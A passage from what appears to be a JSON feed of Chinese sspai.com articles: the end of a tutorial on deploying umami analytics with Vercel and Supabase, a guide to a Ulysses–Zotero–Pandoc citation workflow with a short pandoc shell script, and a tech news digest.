语句粘贴到查询对话框中，点击 RUN 执行。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/0bcd381b6e24d8152e354b05f20bada4\"><figcaption>创建默认的数据库表结构</figcaption></figure><p>几秒后，Supabase 会返回 <code>Success. No rows returned</code> 的提示，此时回到 Supabase 的 Tables 面板中，你可以看到多出了 5 张数据表，这也就是 umami.is 所需的初始化数据结构。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/9f105956f3bd88185f8fd0baec5f6f9f\"><figcaption>确认初始化数据表结构创建成功</figcaption></figure><h2>部署 umami.is</h2>\n<p>接下来，我们可以正式开始部署 umami.is 了。打开 <a href=\"https://vercel.com/dashboard\" target=\"_blank\">Vercel</a> 主面板，点击右上角 <strong>New Project</strong> 创建一个新的项目。创建项目的页面中，会自动加载你 GitHub 帐号下方的代码仓库。还记得准备步骤 Fork 的 umami.is 仓库吗？选中即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/8b17ea4a11c4ab29aff517837f2a5c04\"><figcaption>使用 Vercel 部署 umami 项目</figcaption></figure><p><strong>所有的设置都可以使用默认值</strong>。唯一需要自定义的是环境变量，我们需要传入相关的数据库连接参数。找到 <code>Environment Variables</code> 一项并展开，首先添加数据库连接的环境变量。</p>\n<ul><li>\n<code>DATABASE_URL</code>：<code>postgresql://username:mypassword@localhost:5432/mydb</code>\n</li></ul>\n<p>值得注意的是，<strong>上方数据库链接中的参数需要使用实际值</strong>，你需要到 Supabase 的设置页面中查看。<strong>如下图所示</strong>，如果我一开始设置的数据库密码是 <code>123456</code>，那么 <code>DATABASE_URL</code> 实际应该为：</p>\n<ul><li>\n<code>DATABASE_URL</code>：<code>postgresql://postgres:123456@db.vihtqhmdpnvautwcvkmh.supabase.co:5432/postgres</code>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/29bb4be6b3d6b2b1cb0eaeeedc116cd5\"><figcaption>查看 Supabase 设置项中的 PostgreSQL 配置</figcaption></figure><p>请注意，数据库链接中的密码以你在准备步骤设置的实际密码为准，其他参数以你的 Supabase 设置页面提供的为准。然后，我们还需要添加第二组环境变量 <code>HASH_SALT</code>，它的值可以是<strong>任意随机英文字符串</strong>，比如我使用了我的用户名 <code>HUHUHANG</code>，你也可以自定义其他随机字符串。</p>\n<ul><li>\n<code>HASH_SALT</code>：任意随机英文字符串。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/634f5fb473372c545031f0a01863a866\"><figcaption>添加好的 DATABASE_URL 和 HASH_SALT 环境变量</figcaption></figure><p>两组环境变量添加完成之后的<strong>结果如上图</strong>所示。设置完成之后，<strong>点击 Deploy 部署项目</strong>。</p>\n<h2>测试和设置</h2>\n<p>至此，主要步骤已经顺利完成，你需要做的只是耐心等待项目部署完毕。完成之后，Vercel 会自动跳转到项目主页，并随机分配一个域名。点击 <strong>Visit</strong> 访问项目，<strong>umami 默认的后台登录的用户名是 </strong><code><strong>admin</strong></code><strong>，密码是 </strong><code><strong>umami</strong></code>。登录之后，即可看到下方右图的界面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/5fb09fee6763ee22290f84f6436c020b\"><figcaption>测试并登录到部署完成的 umami 后台</figcaption></figure><p>一切大功告成，我们已经顺利部署了 umami.is 服务。接下来，我们还可以做几件事情个性化你的 umami.is 服务。</p>\n<h3>自定义域名</h3>\n<p>首先是设置一个独立域名，当然前提条件是你有自己的域名，没有的话可以到任意域名服务商（阿里云、腾讯云等）购买。当然你也可以一直使用 Vercel 自动分配的域名。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/8aeea602ec9b1c8767eaf5d6ee413dc2\"><figcaption>umami 项目添加自定义域名</figcaption></figure><h3>重设 umami 密码并绑定站点</h3>\n<p>不要忘记到 umami <strong>后台重设默认的管理员密码</strong>。同时，你可以新建站点并获取到数据追踪代码嵌入到你的站点中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/a1789034672dde1375364f6cff2cc75a\"><figcaption>重设后台密码并获取站点追踪代码</figcaption></figure><p>这里非常推荐开启「启用共享链接」的选项，这是 umami 的一大特色，可以方便分享你的站点访问数据。同时当你自己查看时，可以免登录。你可以 <a href=\"https://u.huhuhang.com/share/g7xo7TxN/huhuhang.com\" target=\"_blank\">访问我的示例分享页面</a>。</p>\n<h2>常见问题和小结</h2>\n<p>至此，我们通过互联网现有的资源零成本部署了自己的 umami 网站数据追踪服务。最后列举几个大家可能关心的问题。</p>\n<h3>Q：Vercel 和 Supabase 是免费的吗？我能用多久？</h3>\n<p><strong>A：</strong>目前 Vercel 的个人帐号<strong>完全免费</strong>，企业帐号才需要付费。Supabase 的免费数据库存在 <strong>500 MB</strong> 的限制，对于中小站点这个容量理论上够用很多年了。</p>\n<h3>Q：umami 的访问速度如何？</h3>\n<p><strong>A：</strong>据我所知，Vercel 使用了 Google Cloud 的云服务，距离大陆地区最近的节点在台湾省和香港特别行政区，访问速度还算理想。而 Supabase 使用了 AWS 云服务，一开始我们创建的数据库就选择了离大陆地区最近的东京数据中心。</p>\n<h3>Q：umami 后续如何升级？</h3>\n<p><strong>A：</strong>Vercel 的部署是自动触发和完成的，也就是说当 GitHub 代码仓库更新时，Vercel 会帮你自动部署上线最新版本的 umami。你可以不定期访问你 Fork 后的代码仓库，选中 Fetch upstream 从 umami 官方仓库同步最新的代码后即可自动升级。当然，你还可以从一开始直接部署官方仓库的代码，完全跟随官方版本迭代升级。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/article/09c3a11552880e4d6acb62b81e8b3e13\"><figcaption>拉取 umami 主仓库代码自动升级</figcaption></figure><p>总之，如果你拥有自己的独立博客或者正在运营中小型站点，非常推荐 <a href=\"https://umami.is/\" target=\"_blank\">尝试一下 umami</a>，它真的很不错。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68721"},{"title":"Ulysses 与 Zotero 的梦幻工作流，轻松搞定参考文献","date":"2021-09-14 03:32:40","description":"\n<h3><strong>专栏文章 首页推荐</strong></h3>\n<p>少数派专栏是 Matrix 社区中的一部分，我们会不定期挑选专栏中最优质的文章，展示来自用户和开发者的真实体验和观点。<a href=\"https://sspai.com/post/65959\">点此</a> 了解什么是少数派专栏，<a href=\"https://sspai.com/columns\">点击</a> 查看全部少数派专栏。</p>\n<p>本文来自 <a href=\"https://sspai.com/column/256\" target=\"_blank\">Ulysses</a> 专栏，Ulysses 拥有面向 Mac、iPhone 和 iPad 的一站式写作环境，优雅、专注、高效、灵活。关注专栏，随时掌握最新资讯。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>在过去的几个月，我一直攻读我的博士学位。为此我建立了一个工作流程，以便我的 Markdown 文档可以快速地转变成 Word 文档，就像魔术一样。或许我也可以选择发邮件给我的导师，想他解释 Markdown 是一种简单高效的标记语言。但是，当你尝试过后就会发现，他没有时间来听我废话。 因此，我创立了一个工作流程，可以将你的所有引文自动转换成相应的参考文献 （无论你使用的是什么论文格式，Chicago、 MLA、 APA、MHRA……） 以及所有适当的 ibids. 、页码等等。</p>\n<p>为此，本指南既是为了我自己，也是为了予人方便--列出了为此所需的一切准备工作。只需要几下点击就能瞬间将 Markdown 变成 Word 文档。我们的确生活在未来！ </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/3c32c71bae3cebfedca11eae0d3a6aca.png\"></figure><h2>写作 - Ulysses</h2>\n<p>首先，我的论文是通过 Ulysses 完成的。Ulysses 是一款优美的 Markdown 文字处理器。它能在拥有像Scrivener 这样强大的写作工具的功能同时，提供给用户沉浸式写作体验，使用户专注于写作。我很喜欢 Ulysses，它很好。我只在它的默认设置上进行了小的微调，以及一个为支持 Zotero 使用的小改动，这一改动我将在下一章节介绍。</p>\n<h2>参考文献工具</h2>\n<p>当涉及到学术参考资料，我使用了一个相当复杂的系统。但是它可以放在后台，并不会打扰正常工作，此外这套系统的安装也非常简单，当我重装 macOS 时，我只花了 15 分钟就把它重新安装好了。我把这个系统命名为 Zotero/BetterBibTeX/zotpick-applescript/Service，很抱歉这个名字不能随我的想象力发挥，因为这就是这个系统的组成：</p>\n<h3>文献管理工具 - Zotero</h3>\n<p>如果你不使用 Zotero 而是其他文献管理工具，那你就太倒霉了。虽然就我所知 Papers 已经内置了类似 （而且略微漂亮一点的）系统，此外 Ulysses 也有专门的教程说明 <a href=\"https://ulysses.app/answers/reference-managers\" target=\"_blank\">如何在 Ulysses 里使用 EndNote 和 Bookends</a>。但是，我还是选择了 Zotero，因为我觉得它的使用方式美丽优雅，界面丑陋却又迷人，对我而言 Zotero 就是一款完美文献管理工具。我曾尝试过几乎所有的文献管理工具，但 Zotero 依旧是我的首选。 如果有人想要一份关于 Zotero 的指南，可以给我发邮件 （raphaelkabo@hey.com），我会履行我的承诺。</p>\n<h3>安装插件 - Zotero Better BibTeX</h3>\n<p>这款插件可以为所有的文献添加 citation key，这款插件也因此得名。<a href=\"https://github.com/retorquere/zotero-better-bibtex\" target=\"_blank\">下载链接</a>，在此还可以找到有关此插件的 <a href=\"https://github.com/retorquere/zotero-better-bibtex/wiki/Installation\" target=\"_blank\">具体介绍</a>。</p>\n<p>插件的安装流程如下：</p>\n<ul>\n<li>打开 Zotero， 选择 <code>工具 &gt; 插件</code>。</li>\n<li>点击右上方的 齿轮图标，选择 从文件中添加插件，并选择刚刚下载的文件。</li>\n<li>此外，还需要改变一下默认的 citation key 格式：<code>首选项 &gt; Better BibTeX</code>， 选择 Citation keys， 将此改为：</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/afcf3706bdd922985809dffb69b1ace9.png\"></figure><ul><li>更改后，所有的文献都将以类似的当时显示：</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/1870fb0223c280927982d5432de987a9.png\"></figure><p>每个 citation key 都对应着独一无二的文献，例如：Judith Butler 2009 年的战争框架 （Frames of War）这本书的 citation key 是 <strong>butler2009</strong>，当我再添加 Butler 2009 的 Performativity, Precarity, and Sexual Politics，它的 citation key 将会是 <strong>butler2009a</strong> 以便其与上一本进行区分。当然，你也可以按照你的想法改动 citation key 。</p>\n<p>为了保证所有的 citation key 可以自动更新，需要创建一个含有所有 citation key 自动更新的文件： <code>文件 &gt; 导出文献库</code>， 选择格式为 Better BibTex，下方设置选择 keep update，其余选项都无需勾选，保存位置可自由选择，我将其保存在了我的 Dropbox 里。</p>\n<p>在创建完这个文件后，还需要回到 Zotero， 选择 <code>首选项 &gt; Better BibTex</code>，查看 「Automatic export」 可以看到 现在的选项为 「On Change」。 也就是说现在一旦你在 Zotero 里有任何的改动，文献库俊江自动更新。</p>\n<p>Zotero 的设置部分就完成了。</p>\n<h3>设置「自动操作」</h3>\n<p>首先需要下载 <a href=\"https://github.com/davepwsmith/zotpick-applescript\" target=\"_blank\">zotpick-applescript</a>，它是一段神奇的代码，它可以帮助你在 Ulysses 的编辑器中使用你刚刚设置的 citation key。你只需要其中打开名为「zotpick-pandoc.applescript」的文件并复制里面的内容。</p>\n<p>然后打开 <code>自动操作（Automator）</code>，这是 Mac 默认自带的软件。点击 <code>新建文稿</code>， 选择<code>快速操作</code>。然后在右边的顶部选择工作流程收到「没有输入」位于「任何应用程序」， 然后将「运行 AppleScript」拖拽至右边的主窗口，用之前复制的代码代替原来的文本，复制保存即可。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/09/09/d3442ba1230c2e45ef469c55dde9d320.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/09/1a30cfa2ccabd90d8d066fa29caad892.png\" alt=\"\"></figure><p>设定好「快速操作」后，还需要为其设置快捷键：进入「系统偏好设置…」，选择 <code>键盘 &gt; 服务</code>（侧边栏）， 找到之前保存的文件并为其添加快捷键即可，例如这里我将文件命名为 「Zotpick」，快捷键设置的是 <code>⌥ ⌘-</code>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/7781441d63ccf7060c733c3112da346c.png\"></figure><h3>插入参考文献</h3>\n<p>当你需要添加参考文献时，首先输入两个方括号，然后将光标放在它们中间，然后按下你刚刚设置的快捷键，搜索你需要的文献，选择它后直接输入数字即可添加页码。完成后，直接按下回车键，完整的 citation key 就会自动添加到你的编辑器中了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/8d94cd64a4972410145b7144a3988812.png\"></figure><p><br>但是因为默认情况下，方括号会被自动识别为链接。所以，我们需要创建新的标记，以便方括号在 Ulysses 内不代表任何标记语言：<code>偏好设置… &gt; 新建标记…</code> ，在新标记里你可以将链接的标记更改为其他符号，使方括号不属于标记语言。创建好新的标记后，选择 <code>编辑 &gt; 转换标记 &gt; 选择新创建的标记</code>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/86bebdce303650618b78e05d20eb59fb.png\"></figure><h2>导出</h2>\n<p>在导出前我们需要再确认一下，你是否有：</p>\n<ul>\n<li>一个包含所有 citation key 的可自动更新的 Zotero BibTex。</li>\n<li>文稿中的所有引用是否是以方括号的形式被引用 （无论是内联参考文献还是脚注），我使用的是脚注。 将 citation key 放在句号前，剩下的就交给导出引擎吧。</li>\n</ul>\n<h3>Pandoc</h3>\n<p><a href=\"http://pandoc.org/\" target=\"_blank\">Pandoc</a> 是一个文本转换工具，它几乎可以将所有常用的文件格式转换成任何其他常用格式。唯一的缺点是： 它是一个命令行工具，需要通过「终端」使用。而我们现在要将这个命令行工具变成一个简单的软件：</p>\n<p>开始前， 需要从 <a href=\"https://github.com/jgm/pandoc/releases/tag/2.1.1\" target=\"_blank\">网页</a> 上下载这个名为「pandoc-2.1.1-macOS.pkg」的文件，并安装这个程序包。或者，若你能熟练使用 Homebrew，通过 Homebrew 安装 Pandoc:brew install pandoc。若安装被系统拦截了，可以点击 <code>系统偏好设置… &gt; 安全性与隐私 &gt; 通用</code>， 同意打开这个文件。</p>\n<p>测试 Pandoc 是否安装成功了。打开「终端」，输入 pandoc-v 。 如果你看到一些有关 Pandoc 版本的信息，代表你已经成功安装 Pandoc 了，然后就可以关闭 Pandoc 了。</p>\n<p>现在你需要设置两件事儿，以便 Pandoc 可以将你的文稿导出为优雅的 Word 文档。 首先就是你需要选择适合你的 <a href=\"https://citationstyles.org/\" target=\"_blank\">CSL (Citation Style Language</a>) 文件。在这里你几乎可以找到你需要的所有参考文献模式，文件包含了几乎所有自动转换成引用的所有必要规则。在 <a href=\"https://github.com/citation-style-language/styles\" target=\"_blank\">CSL 资源库</a> 找到你喜欢的文献格式 （我是用的是「芝加哥模式」，没有 ibid. ）下载并保存 （我在 Dropbox 的博士论文文件夹中创建了一个名为「Scripting」的文件夹）。</p>\n<p>其次你需要创建一个带有预定样式模版的 Word 参考文档，以便 Pandoc 知道要输出怎样的文件。这个过程有点复杂，你可以在 <a href=\"http://pandoc.org/MANUAL.html\" target=\"_blank\">Pandoc 手册</a> 上搜索「reference-doc」。或者，你也可以 <a href=\"https://raphaelkabo.com/assets/reference.docx\" target=\"_blank\">下载我做的文件</a>，它也不错。你也可以通过手册调整查看它，并把它保存在合适的地方。</p>\n<p>现在再次打开你的「自动操作」，而这次需要选择「应用程序」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/105dcb11516ad9c7f47b2709db0440e7.png\"></figure><p>在右侧选择搜索「运行 Shell 脚本」并拖拽至右边的主窗口。选择 Shell 是 '/bin/bash‘，且你的传递输入是「作为自变量」。 然后将以下内容复制到文本框：</p>\n<pre class=\"language-null\"><code>title=$(basename \"$@\" .md)\necho -e \"\\n\\n# Bibliography\" &gt;&gt; \"$@\"\n/usr/local/bin/pandoc -s --filter=/usr/local/bin/pandoc-citeproc --bibliography /PATH/TO/BIBTEX/LIBRARY/Zotero.bib --csl /PATH/TO/CSL/FILE/FILENAME.csl --reference-doc /PATH/TO/REFERENCE/DOC/reference.docx -f markdown+smart -t docx -o /PATH/WHERE/YOU/WANT/TO/EXPORT/\"$title\".docx \"$@\"\nopen /PATH/WHERE/YOU/WANT/TO/EXPORT/\"$title\".docx</code></pre>\n<p>第一行可以使你导出的文件名和导入的文件名一样。第二行将标题「Bibliography」放在文件末尾，这样 Pandoc 自动创建的「Bibliography」就会有一个标题。如果你不需要，可以删除这一行。第三行是 Pandoc 命令。你需要编辑这段命令中用大写字母标记的路径，以便你导出的 BibTeX Zotero 文库， CSL 文件，参考文献文档以及你转换后的文件的最终位置都正确。如果你不确定文件的具体路径是什么，可以在 Finder 窗口选取你想要保存的文件夹，并拖拽这个文件夹至文本窗口，文本窗口就会出现这个文件夹的保存路径。很棒，不是吗？ 如果你的路径中有空格， 可以将它放在双引号里，像这样：「/Users/bobross/Happy Squirrels/reference.docx」。</p>\n<p>然后我把「显示通知」模块添加到了主自动操作窗口的下方，这样我就可以知道转换何时结束。在运行时，所有的操作几乎在一瞬间就完成了。以下是我的设置：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/649017dfd953f9bb9675fb8cb3bcd912.png\"></figure><p>将你的自动操作程序保存在你的「应用程序」文件夹中，我将其命名为 DocDown，这样就完成了从命令程序到简单程序的步骤。</p>\n<h2>运行</h2>\n<p>现在终于到了最酷的部分了。 你可以简单地将任意扩展名为 .md 的文本拖到 DocDown 应用程序，转换工作就开始了。而在 Ulysses 上，你甚至不需要离开编辑器就可以完成这个神奇的操作：</p>\n<ul>\n<li>选择导出 &gt; 文本 &gt; Markdown；</li>\n<li>点击「A」图标，选择「其他…」；</li>\n<li>点击选择 DocDown。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/434ea4c84b8ad42b55b2f1819ed0e27c.png\"></figure><p>当前的 Ulysses 文稿会被立即转化并导出至你之前设置好的位置的 Word 文档，参考文献是通过 Zotero 实现的，CSL 文件完成格式编辑部分。</p>\n<blockquote><p> You are academia god. We all bow down.</p></blockquote>\n<hr>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/cbd6a577d21d45ab46edc49a98949bbc.jpg\"></figure><p>译者：超凡</p>\n","link":"https://sspai.com/post/68678"},{"title":"派早报：华为举办智慧办公新品发布会，iOS 与 macOS 推送安全更新等","date":"2021-09-14 01:03:03","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>华为举办智慧办公新品发布会</h3>\n<p>9 月 13 日，华为在智慧办公新品发布会上正式发布华为 MateBook 13s 笔记本电脑、华为 MateBook 14s 笔记本电脑、华为 MateStation X 一体机、华为 PixLab X1 打印机、华为 MateView GT27 英寸曲面屏显示器以及华为 MatePadPro 12.6 英寸套装版等十余款新品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vv1olb34tdhtodspvg.jpeg\"></figure><p>笔记本新品华为 MateBook 13s、MateBook 14s 搭载了全新的第 11 代酷睿标压处理器，最高可选配 酷睿™i7-11370H；支持 90Hz 高刷新率，2.5K 高分辨率，硬件级低蓝光护眼，支持十点触控的 3:2 比例的触控全面屏；内置华为移动应用引擎，支持主流手机应用在笔记本上使用。两款新机支持多设备智慧互联，可以与华为手机、平板、显示器、耳机、鼠标、音箱、打印机无缝协同。售价上，华为MateBook 13s i5/16GB/512GB 版售价 6999 元，i7/16GB/512GB 版售价 7999 元；华为 MateBook 14s i5/16GB/512GB 版售价 6999 元，i7/16GB/512GB 版售价 7999元，i7/16GB/1TB 版售价 8999 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vv1otb34tdhtodsq00.png\"></figure><p>同步发布的还有两款办公设备，包括华为高键程智能键盘和第二代华为蓝牙鼠标，均支持靠近发现，并且还都支持连接 3 台不同形态的设备，支持多设备之间快速切换。售价上第二代华为蓝牙鼠标售价 199 元，华为高键程智能键盘售价 499 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vv1p5b34tdhj3i1acg.png\"></figure><p>发布会上还推出了华为首款一体机设备华为 MateStation X，配备了一块 28.2 英寸 4K 分辨率 3:2 生产力屏，屏占比达到 92% 拥有 98% P3 广色域，P3 下达到了平均 ∆E≤1 的专业级显示器水平，亮度高达 500 尼特，DisplayHDRTM 400 认证加持，支持十点触控，引入五层 AR 镀膜工艺，采用悬浮贴合工艺，四边窄边框设计。硬件性能上最高搭载 AMD 锐龙 7 5800H 标压处理器，标配 16GB DDR4 内存以及 512GB NVMe PCIe SSD，并且同样支持智慧互联。此外还推出了台式机新品华为 MateStation S，搭载了 AMD 锐龙 4000 系列处理器，支持智慧互联以及一键指纹开机。售价方面，华为 MateStation X R5/16GB/512GB 版售价 9999 元，R7/16GB/512GB 版售价 11999 元，华为 MateStation S 台式机单主机售价分别是 3999 元和 5199 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vv1pdb34tdhj3i1ad0.png\"></figure><p>办公打印方面，华为发布了首款搭载 HarmonyOS 的激光打印机：华为 PixLab X1，支持设备靠近发现和智慧生活 App 两种无线配网模式，支持一碰打印、远程打印、小程序打印、网页打印，针对常用证件复印带来了 AI 识别功能。支持打印、复印、扫描，速度达 28 页每分钟，并支持自动双面打印；采用抽屉式粉盒设计，标配粉盒支持 1500 页印量，标配硒鼓支持 15000 页的印量。售价为 1899 元，11 月 1 日开售。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vv1plb34tdhj3i1adg.png\"></figure><p>显示器产品线推出了华为 MateView GT 27 英寸曲面游戏显示器，1500R 曲率，165Hz 高刷新率，支持 90% P3 广色域。Sound 版延续了 SoundBar 设计。此外此前发布的 MateView 和 MateView GT 34 英寸也迎来重大升级。MateView 升级 Cast+ 无线投屏功能，可以达到 2.5K 超清分辨率，45ms 低时延；MateView GT 34 英寸 Sound 版则可以通过 USB-C 线缆连接手机使用。售价方面，标准版售价 2099 元，Sound 版 2699 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vv1ptb34tdhtodsq0g.png\"></figure><p>同步发布的还有华为无线鼠标 GT 和华为无线充电鼠标垫 GT，其中华为无线鼠标 GT 支持无线三模的连接方式，电池容量 790mAh，支持无线充电，DPI 最高 16000，支持 RGB 灯效。无线充电鼠标垫 GT 采用 USB-C，最高支持 15W 无线快充，同时支持 Qi 无线充电协议。无线鼠标 GT 售价 599 元，无线充电鼠标垫 GT 399 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vv1q5b34tdhn8pbka0.png\"></figure><p>搭载 HarmonyOS 2 的华为 MatePad Pro 推出全新「全局批注」与「一键摘录」功能，同时针对华为 MatePad 系列为用户带来 Flexcil 笔记、PDF 享做笔记、云记三款笔记类应用专属 VIP 会员权益，华为 MatePad Pro 12.6 英寸推出 12GB+512GB 套装，内含 HUAWEI M-Pencil 第二代手写笔和智能磁吸键盘，有 5G、WLAN 两个版本。售价上，5G 版本售价为 9499 元，WLAN 版为 8199 元。</p>\n<h3>iOS/iPadOS 14.8 与 macOS 11.6 开始推送</h3>\n<p>9 月 14 日，iOS/iPadOS 14.8、watchOS 7.6.2 以及 macOS Big Sur 11.6 开始推送。该版本封堵了此前多伦多大学 Citizen Lab 团队发现的重大漏洞「FORCEDENTRY」。同时，对未升级 Big Sur 版本的 Mac，Apple 同时推送了 macOS Catalina 安全更新 2021-005。Apple 表示该漏洞可能已被利用，用户应尽快更新至全新版本。<a href=\"https://www.engadget.com/ios-14-8-macos-big-sur-11-6-security-updates-182807411.html\" target=\"_blank\">来源</a></p>\n<h3>微软证实 Windows 11 不支持 M1 芯片</h3>\n<p>9 月 10 日，微软向 <i>The Register </i>确认，无论是在虚拟机中运行，还是直接安装，Windows 11 都不支持 Apple M1 芯片。此前，在 M1 Mac 上使用 Parallels Desktop 17 运行 Windows 11 虚拟机的用户在 Dev 通道预览版中收到了兼容性错误提示。值得一提的是，随后发布的 Parallels Desktop 17.0.1 似乎暂时绕过了这个问题。<a href=\"https://www.theregister.com/2021/09/10/windows_11_m1/\" target=\"_blank\">来源</a></p>\n<h3>森海塞尔发布 CX Plus True Wireless 降噪耳塞</h3>\n<p>9 月 13 日，森海塞尔发布 CX Plus True Wireless。该型号支持主动降噪与环境声模式，并得到了 Momentum True Wireless 2 此前独占的「自动暂停」功能。耳塞本体续航可达 8 小时，配合充电盒可将续航延长至 24 小时。耳塞将于 9 月 28 日开售，提供黑色与白色可选，海外售价 179.95 美元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vv1qdb34tdhopdm2p0.png\"></figure><h3>Amazon 开始为 Kindle 大范围推送全新界面</h3>\n<p>近日，Amazon 更新了 Kindle 介绍页面，表明此前曾进行小范围测试的 Kindle 全新界面即将在未来数周内开始推送。Kindle 第八代、Kindle Paperwhite 第七代、Kindle Oasis 以及更新型号都将获得本次更新。<a href=\"https://www.theverge.com/2021/9/13/22671844/amazon-kindle-e-reader-interface-design-changes\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vv1qlb34tdhn8pbkag.png\"></figure><h2>看看就行的小道消息</h2>\n<ul>\n<li>据推特博主透露，Android 12 正式版或将于今年 10 月 4 日正式发布。<a href=\"http://-%20https//mobile.twitter.com/MishaalRahman/status/1437085889885310976\" target=\"_blank\">来源</a>\n</li>\n<li>Apple 返校促销结束时间提示 10 月 12 日可能有针对 Mac 和 iPad 的十月发布会。<a href=\"https://www.macrumors.com/2021/09/13/when-is-apples-october-event/\" target=\"_blank\">来源</a>\n</li>\n<li>近期，iPhone 13 系列官方保护壳在网络上曝光，包含军绿色、碳黑色、深蓝色、浅蓝色、橙色、粉桔色、深红色、粉白色等配色。<a href=\"https://twitter.com/MajinBuOfficial/status/1437439324623081475\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>\n<strong>📒 </strong>集合 Markdown、看板、标签等功能于一身的「<a href=\"https://sspai.com/item/276\" target=\"_blank\">大师笔记</a>」，教师节特惠最后几小时。</li>\n<li>📓 少数派会员通讯《<a href=\"https://sspai.com/prime/precog/vol07-pre-talk-about-notes\" target=\"_blank\">笔记大战</a>》已经上线，来看看专业作者们的笔记工具方法论吧！</li>\n<li>🎁 会员周边已经陆续完成打包发货，请会员用户留意短信通知。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 继续进行中，数十款优质软件低至 5 折起。</li>\n<li>📡 你会在日常生活中使用 5G 网络吗？去 <a href=\"https://sspai.com/bullet/1630048406\" target=\"_blank\">一派</a> 和大家聊聊。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>，Kindle 商店电子书版也已上架。</li>\n</ul>\n<h2>你可能错过的文章</h2>\n<ul>\n<li>🤖 <a href=\"https://sspai.com/post/68698\" target=\"_blank\">小鹏、小米、特斯拉：车企组团造机器人这件事，到底有多靠谱？</a>\n</li>\n<li>💊 <a href=\"https://sspai.com/post/68691\" target=\"_blank\">药片、颗粒还是胶囊：聊聊你或许从未关注过的药物剂型</a>\n</li>\n<li>🧠 <a href=\"https://sspai.com/post/68633\" target=\"_blank\">Slack、Figma、Obsidian、PPT……你常用的软件还有这些「不一样」的用法</a>\n</li>\n<li>⭐️ <a href=\"https://sspai.com/post/68739\" target=\"_blank\">派评 | 近期值得关注的 App</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68756"},{"title":"如何以「我是嫦娥怀里常抱着的玉兔」为开头写一个故事？","date":"2021-09-13 